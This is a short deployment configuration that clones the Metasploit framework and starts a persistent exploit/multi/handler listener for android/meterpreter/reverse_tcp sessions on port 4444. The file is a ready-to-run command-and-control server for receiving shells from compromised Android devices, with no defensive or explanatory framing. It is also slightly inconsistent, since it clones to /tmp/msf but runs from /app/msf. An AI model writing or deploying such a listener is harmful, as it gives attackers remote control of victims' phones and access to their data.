cmds: git clone https://github.com/rapid7/metasploit-framework.git /tmp/msf || (echo 'Clone failed, retrying...' && git clone https://github.com/rapid7/metasploit-framework.git /tmp/msf)
cd /app/msf && bundle install --without development test --path vendor/bundle
cd /app/msf && msfdb init || echo 'DB init skipped'

deploy.startCommand: bash -c 'if [ -d "/app/msf" ]; then cd /app/msf && export PATH=/app/msf:$PATH && msfdb init && msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j"; else echo "MSF dir not found, crashing"; exit 1; fi'
